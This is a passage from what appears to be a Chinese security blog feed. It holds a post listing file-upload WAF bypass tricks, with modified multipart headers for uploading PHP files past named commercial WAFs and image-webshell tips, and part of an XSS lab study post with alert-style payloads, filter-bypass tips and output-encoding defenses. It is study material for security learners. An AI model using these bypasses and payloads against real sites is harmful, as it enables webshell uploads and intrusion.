href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700&sudaref=www.google.com.hk&display=0&retcode=6102%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%80%E7%AF%87%E9%9D%9E%E5%B8%B8%E4%B8%8D%E9%94%99%E7%9A%84%E6%96%87%E7%AB%A0%E3%80%82">https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102，这是一篇非常不错的文章。</a></p><p><strong>waf位置</strong></p><p><img src="image-20210214204416120.png" alt="image-20210214204416120"></p><h3 id="1-waf校验"><a href="#1-waf校验" class="headerlink" title="1.waf校验"></a>1.waf校验</h3><p>上传文件时waf检查文件的位置：</p><ol><li><p>请求的url</p></li><li><p>Boundary边界</p></li><li><p>MIME类型</p></li><li><p>文件扩展名</p></li><li><p>文件内容</p></li></ol><h3 id="2-bypasswaf"><a href="#2-bypasswaf" class="headerlink" title="2.bypasswaf"></a>2.bypasswaf</h3><h4 id="1-后缀"><a href="#1-后缀" class="headerlink" title="1.后缀"></a>1.后缀</h4><p>常见的后缀黑名单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">asp|asa|cer|cdx|aspx|ashx|ascx|asax</span><br><span class="line">php|php2|php3|php4|php5|asis|htaccess</span><br><span class="line">htm|html|shtml|pwml|phtml|phtm|js|jsp</span><br><span class="line">vbs|asis|sh|reg|cgi|exe|dll|com|bat|pl|cfc|cfm|ini</span><br></pre></td></tr></table></figure><p>这算是比较全的黑名单了吧，一般来说，不存在黑名单绕过的情况，除非开发人员水的一逼。。。</p><p>其实这一部分和<strong>服务端校验后缀差不多</strong>。</p><h4 id="2-HTTP数据包"><a href="#2-HTTP数据包" class="headerlink" title="2.HTTP数据包"></a>2.HTTP数据包</h4><p>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。</p><h5 id="1-常见waf绕过"><a href="#1-常见waf绕过" class="headerlink" title="1.常见waf绕过"></a>1.常见waf绕过</h5><p><strong>安全狗绕过</strong></p><p>1.绕过思路：对文件的数据包进行处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关键点在这里Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ian.php&quot;</span><br><span class="line">将form-data;            修改为~form-data;</span><br></pre></td></tr></table></figure><p>2.通过替换大小写来进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">将Content-Disposition    修改为content-Disposition</span><br><span class="line">将 form-data            修改为Form-data</span><br><span class="line">将 Content-Type         修改为content-Type</span><br></pre></td></tr></table></figure><p>3.通过删减空格来进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">将Content-Disposition: form-data          冒号后面 增加或减少一个空格</span><br><span class="line">将form-data; name=&quot;file&quot;;                分号后面 增加或减少一个空格</span><br><span class="line">将 Content-Type: application/octet-stream   冒号后面 增加一个空格</span><br></pre></td></tr></table></figure><p>4.通过字符串拼接绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">看Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh3.php&quot;</span><br><span class="line">将 form-data 修改为   f+orm-data</span><br><span class="line">将 from-data 修改为   form-d+ata</span><br></pre></td></tr></table></figure><p>5.双文件上传绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;https://www.xxx.com/xxx.asp(php)&quot; method=&quot;post&quot;</span><br><span class="line">name=&quot;form1&quot; enctype=&quot;multipart/form‐data&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName1&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input name=&quot;FileName2&quot; type=&quot;FILE&quot; class=&quot;tx1&quot; size=&quot;40&quot;&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;上传&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>6.HTTP header 属性值绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br><span class="line">我们通过替换form-data 为*来绕过</span><br><span class="line">Content-Disposition: *; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</span><br></pre></td></tr></table></figure><p>7.HTTP header 属性名称绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源代码:</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">绕过内容如下：</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br><span class="line">删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php&quot;.</span><br></pre></td></tr></table></figure><p>8.等效替换绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原内容：</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------471463142114</span><br><span class="line">修改后:</span><br><span class="line">Content-Type: multipart/form-data; boundary =---------------------------471463142114</span><br><span class="line">boundary后面加入空格。</span><br></pre></td></tr></table></figure><p>9.修改编码绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用UTF-16、Unicode、双URL编码等等</span><br></pre></td></tr></table></figure><p><strong>WTS-WAF 绕过上传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原内容：</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.php&quot;</span><br><span class="line">添加回车</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; file</span><br><span class="line">name=&quot;xss.php&quot;</span><br></pre></td></tr></table></figure><p><strong>百度云上传绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云绕过就简单的很多很多，在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。</span><br><span class="line">Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.jpg .Php&quot;</span><br></pre></td></tr></table></figure><p><strong>阿里云上传绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源代码：</span><br><span class="line">Content-Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.jpg .Php&quot;Content-Type: image/jpeg</span><br><span class="line">修改如下：</span><br><span class="line">Content-Disposition: form-data; name=&quot;img_crop_file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">没错，将=号这里回车删除掉Content-Type: image/jpeg即可绕过。</span><br></pre></td></tr></table></figure><p><strong>360主机上传绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">源代码:</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">绕过内容如下：</span><br><span class="line">Content- Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">Content-Disposition 修改为 Content-空格Disposition</span><br></pre></td></tr></table></figure><h5 id="2-常规绕过手法"><a href="#2-常规绕过手法" class="headerlink" title="2.常规绕过手法"></a>2.常规绕过手法</h5><p><strong>MIME类型绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传木马时，提示格式错误。直接抓包修改Content-Type 为正确的格式尝试绕过</span><br></pre></td></tr></table></figure><p><strong>CONTENT-LENGTH绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">针对这种类型的验证，我们可以通过上传一些非常短的恶意代码来绕过。上传文件的大小取决于，Web服务器上的最大长度限制。我们可以使用不同大小的文件来fuzzing上传程序，从而计算出它的限制范围。</span><br></pre></td></tr></table></figure><p>下面内容，都是基于文件名解析。</p><p><strong>垃圾数据填充绕过</strong></p><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</p><ul><li>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验<br><img src="image-20210215001437086.png" alt="image-20210215001437086"></li><li>将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验<br><img src="image-20210215001504949.png" alt="image-20210215001504949"></li><li>将垃圾数据加到Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</li></ul><p><strong>多个filename</strong></p><p>早期版本安全狗，可以多加一个filename</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p>最终上传成功的文件名是test.php。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p><p><strong>交换name和filename的顺序</strong></p><p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file_x</span><br></pre></td></tr></table></figure><p><strong>修改引号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=&quot;xx.php&quot;&quot;</span><br></pre></td></tr></table></figure><p>单引号、双引号、不要引号，都能上传。</p><p><strong>大小写</strong></p><p>对这三个固定的字符串进行大小写转换</p><ul><li>Content-Disposition</li><li>name</li><li>filename</li></ul><p><strong>空格</strong></p><p>在: ; &#x3D;添加1个或者多个空格。</p><p><strong>去掉或修改Content-Disposition值</strong></p><p>有的WAF在解析的时候，认为Content-Disposition值一定是form-data，造成绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&#x27;file_x&#x27;; filename=&#x27;xx.php&#x27;</span><br></pre></td></tr></table></figure><p><strong>多个boundary</strong></p><p>最后上传的文件是test.php而非test.txt，但是取的文件名只取了第一个就会被Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.txt&quot;</span><br><span class="line">Content-Type: text/javascript</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;test.php&quot;</span><br><span class="line">Content-Type: text/javascript</span><br></pre></td></tr></table></figure><p><strong>多个分号</strong></p><p>文件解析时，可能解析不到文件名，导致绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;;;; filename=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p><strong>Header在boundary前添加任意字符</strong></p><p>PHP支持，JAVA报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure><p>** filename换行**</p><p>PHP支持，Java不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file_x&quot;; file</span><br><span class="line">name=&quot;test.php&quot;</span><br></pre></td></tr></table></figure><p><strong>name和filename添加任意字符串</strong></p><p>PHP支持，Java不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=&quot;file_x&quot;; bypass waf upload; filename=&quot;test.php&quot;;</span><br></pre></td></tr></table></figure><h4 id="3-文件内容"><a href="#3-文件内容" class="headerlink" title="3.文件内容"></a>3.文件内容</h4><p>针对文件内容检测的绕过，一般有两种方式，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.制作图片马</span><br><span class="line">2.文件幻术头绕过</span><br></pre></td></tr></table></figure><p>另外呢就是对敏感的函数进行检测，比如exec()、eval()这些函数，对应的解决方法是进行替换或者”变形“</p><p><strong>POST&#x2F;GET</strong></p><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>现在基本上很难遇到能够上传恶意文件的漏洞了，一般是结合cms漏洞和各种cve(我一般是这样的、、、)，因为很难遇到逻辑有问题的代码了，这就体现了前期信息收集的重要性了。</p><p>参考：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p><p><a href="http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Critical-chunks">http://www.libpng.org/pub/png/spec/1.2/PNG-Chunks.html#C.Critical-chunks</a></p><p><a href="https://secgeek.net/bookfresh-vulnerability/">https://secgeek.net/bookfresh-vulnerability/</a></p><p><a href="https://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://zhzhdoai.github.io/2019/07/10/PHP%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><p><a href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.secpulse.com/archives/117827.html">https://www.secpulse.com/archives/117827.html</a></p><p><a href="https://www.anquanke.com/post/id/164561#h2-1">https://www.anquanke.com/post/id/164561#h2-1</a></p><p><a href="https://www.anquanke.com/post/id/153376">https://www.anquanke.com/post/id/153376</a></p><p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/">https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.dazhuanlan.com/2019/11/04/5dbfacb696546/">https://www.dazhuanlan.com/2019/11/04/5dbfacb696546/</a></p><p><a href="https://mp.weixin.qq.com/s/lM8XeOpxP1871U_3EVPCDg">https://mp.weixin.qq.com/s/lM8XeOpxP1871U_3EVPCDg</a></p><p><a href="https://choge.top/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/">https://choge.top/2020/02/29/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8/</a></p><p><a href="https://www.anquanke.com/post/id/164561">https://www.anquanke.com/post/id/164561</a></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><p><a href="https://www.hacking8.com/MiscSecNotes/bypass-waf-cookbook.html">https://www.hacking8.com/MiscSecNotes/bypass-waf-cookbook.html</a></p><p><a href="https://weibo.com/ttarticle/p/show?id=2309404007261092631700&sudaref=www.google.com.hk&display=0&retcode=6102">https://weibo.com/ttarticle/p/show?id=2309404007261092631700&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102</a></p><p><a href="https://www.cnblogs.com/-qing-/p/10832850.html">https://www.cnblogs.com/-qing-/p/10832850.html</a></p><p><a href="https://huyuanzhi2.github.io/2020/04/02/bypass-waf-upload-jsp/">https://huyuanzhi2.github.io/2020/04/02/bypass-waf-upload-jsp/</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xss-labs记录</title>
      <link href="/2020/01/04/xss-labs%E8%AE%B0%E5%BD%95/"/>
      <url>/2020/01/04/xss-labs%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p>记录一下学习xss入门的过程。</p><span id="more"></span><h2 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h2><h3 id="1-认识xss"><a href="#1-认识xss" class="headerlink" title="1.认识xss"></a>1.认识xss</h3><p>xss的英文名字是cross-site-script，俗称跨站脚本，是一种注入攻击，指攻击者在被攻击的网页上利用编写时的漏洞注入恶意脚本代码，受害者访问该页面时，恶意代码会在用户的浏览器上执行。有三种类型，分别是：</p><ul><li><p>反射型</p><ul><li>反射型xss一般出现在URL参数中及网站搜索栏中，由于需要点击包含恶意代码的URL才可以触发，并且只能触发一次，所以也被称为“非持久性xss”。</li></ul></li><li><p>存储型（持续性）</p><ul><li>存储型xss一般会出现在网站留言板，评论处，个人资料处，等需要用户可以对网站写入数据的地方。也被称作“持久性xss”。存储型XSS比反射型更具威胁性，并且可能影响到web服务器自身的安全。</li></ul></li><li><p>dom型</p><ul><li><p>DOM XSS是基于dom文档对象模型，前端脚本通过dom动态修改页面，由于不与服务端进行交互，而且代码是可见的，从前端获取dom中的数据在本地执行。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。<br>常见的可以操纵dom的对象：URL，localtion,referrer等</p><p><img src="image-20210223171100707.png" alt="image-20210223171100707"></p></li></ul></li></ul><h3 id="2-注入技巧"><a href="#2-注入技巧" class="headerlink" title="2.注入技巧"></a>2.注入技巧</h3><h4 id="1-JS常用的弹窗函数"><a href="#1-JS常用的弹窗函数" class="headerlink" title="1.JS常用的弹窗函数"></a>1.JS常用的弹窗函数</h4><blockquote><table bgcolor="red">弹窗搞得动静太大了，一般不建议这么搞。</table></blockquote><p><strong>alert()</strong></p><p>alert是最常用的方法，内容是变量或者字符串，无返回值。</p><p>用法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>confirm()</strong></p><p>confirm比alert多一个“取消“按钮，返回值：确定-true，取消-flase</p><p>用法:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">confirm</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>prompt()</strong></p><p>比confirm多一个输入框，返回值：确定-返回输入的值，字符型，取消-null</p><p>用法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="2-常见注入点"><a href="#2-常见注入点" class="headerlink" title="2.常见注入点"></a>2.常见注入点</h4><ul><li><p>url</p></li><li><p>输入框</p></li><li><p>请求头</p></li><li><p>源码</p><ul><li>form表单中隐藏的<code>input</code>标签可能存在注入点</li><li>EXIF注入，当浏览器解析.jpg图片的时候，某些安装插件的用户会解析图片属性，可以在图片属性中构造注入语句。</li><li>ng-include注入。可将其他存在注入漏洞的页面导入目标页面，进而实现在目标页面的注入。</li><li>当页面存在利用js代码修改修改页面结构的时候，可能存在DOM注入，可以利用<code>#</code>绕过后台防护。</li></ul></li></ul><h4 id="3-常用payload"><a href="#3-常用payload" class="headerlink" title="3.常用payload"></a>3.常用payload</h4><p>本小节来自<a href="https://blog.csdn.net/weixin_43901998/article/details/108360267%EF%BC%8C%E6%AF%94%E6%88%91%E8%87%AA%E5%B7%B1%E6%80%BB%E7%BB%93%E7%9A%84%E9%BD%90%E7%9A%84%E5%A4%9A%E4%BA%86%E3%80%82%E3%80%82%E3%80%82">https://blog.csdn.net/weixin_43901998/article/details/108360267，比我自己总结的齐的多了。。。</a></p><h5 id="1-构造标签"><a href="#1-构造标签" class="headerlink" title="1.构造标签"></a>1.构造标签</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> &lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="number">2.</span> &lt;a href=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="number">3.</span> &lt;img src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="number">4.</span> &lt;body onload=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="number">5.</span> &lt;br size=<span class="string">&quot;&amp;&#123;alert(1)&#125;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h5 id="2-构造事件"><a href="#2-构造事件" class="headerlink" title="2.构造事件"></a>2.构造事件</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="string">&quot; οnclick=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br><span class="line"><span class="number">2.</span> <span class="string">&quot; οnmοuseοver=&quot;</span><span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h5 id="3-绕过思路"><a href="#3-绕过思路" class="headerlink" title="3.绕过思路"></a>3.绕过思路</h5><table><thead><tr><th>防护机制</th><th>可能的绕过措施</th></tr></thead><tbody><tr><td>删除关键字</td><td>双写绕过</td></tr><tr><td>识别关键字改写或阻拦</td><td>大小混写绕过；构造不常用的标签进行注入</td></tr><tr><td>过滤空格</td><td>利用%0a,%09,%0d等代替空格</td></tr><tr><td>过滤script</td><td>利用img等不需要使用script的标签</td></tr><tr><td>过滤标签</td><td>尝试构造事件触发js</td></tr></tbody></table><p><strong>注意：使用html实体编号绕过的时候，实体编号必须要是标签中的属性值（href&#x3D;”实体编号”）或者事件的值(比如οnclick&#x3D;”实体编号”)这样浏览器才会翻译解析。过滤了尖括号就想想能否用on事件来触发漏洞。</strong></p><h4 id="4-常见的防护手法"><a href="#4-常见的防护手法" class="headerlink" title="4.常见的防护手法"></a>4.常见的防护手法</h4><h5 id="1-html实体化"><a href="#1-html实体化" class="headerlink" title="1.html实体化"></a>1.html实体化</h5><h6 id="1-常用函数"><a href="#1-常用函数" class="headerlink" title="1.常用函数"></a>1.常用函数</h6><p><strong>htmlspecialchars()</strong></p><p>函数把预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; #转化结果是  &amp;amp;</span><br><span class="line">” (双引号)   #转化结果是  &amp;quot;</span><br><span class="line">’ (单引号)    #转化结果是  <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;#转化结果是  &amp;lt;</span></span><br><span class="line"><span class="string">&gt;#转化结果是  &amp;gt;</span></span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="keyword">string</span>,[flags,character-set,double_encode])</span><br></pre></td></tr></table></figure><p>解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">string必需。规定要转换的字符串。</span><br><span class="line"></span><br><span class="line">flags可选。规定如何处理引号、无效的编码以及使用哪种文档类型。</span><br><span class="line">可用的引号类型：</span><br><span class="line">ENT_COMPAT - 默认。仅编码双引号。</span><br><span class="line">ENT_QUOTES - 编码双引号和单引号。</span><br><span class="line">ENT_NOQUOTES - 不编码任何引号。</span><br><span class="line"></span><br><span class="line">无效的编码：</span><br><span class="line">ENT_IGNORE - 忽略无效的编码，而不是让函数返回一个空的字符串。应尽量避免，因为这可能对安全性有影响。</span><br><span class="line">ENT_SUBSTITUTE - 把无效的编码替代成一个指定的带有 Unicode 替代字符 U+FFFD（UTF-8）或者 &amp;#FFFD; 的字符，而不是返回一个空的字符串。</span><br><span class="line">ENT_DISALLOWED - 把指定文档类型中的无效代码点替代成 Unicode 替代字符 U+FFFD（UTF-8）或者 &amp;#FFFD;。</span><br><span class="line"></span><br><span class="line">规定使用的文档类型的附加 flags：</span><br><span class="line">ENT_HTML401 - 默认。作为 HTML 4.01 处理代码。</span><br><span class="line">ENT_HTML5 - 作为 HTML 5 处理代码。</span><br><span class="line">ENT_XML1 - 作为 XML 1 处理代码。</span><br><span class="line">ENT_XHTML - 作为 XHTML 处理代码。</span><br><span class="line"></span><br><span class="line">character-set可选。一个规定了要使用的字符集的字符串。</span><br><span class="line">允许的值：</span><br><span class="line">UTF-8 - 默认。ASCII 兼容多字节的 8 位 Unicode</span><br><span class="line">cp866 - DOS 专用 Cyrillic 字符集</span><br><span class="line">cp1251 - Windows 专用 Cyrillic 字符集</span><br><span class="line">cp1252 - Windows 专用西欧字符集</span><br><span class="line">BIG5 - 繁体中文，主要在台湾使用</span><br><span class="line">GB2312 - 简体中文，国家标准字符集</span><br><span class="line">MacRoman - Mac 操作系统使用的字符集</span><br><span class="line">注释：在 PHP 5.4 之前的版本，无法被识别的字符集将被忽略并由 ISO-8859-1 替代。自 PHP 5.4 起，无法被识别的字符集将被忽略并由 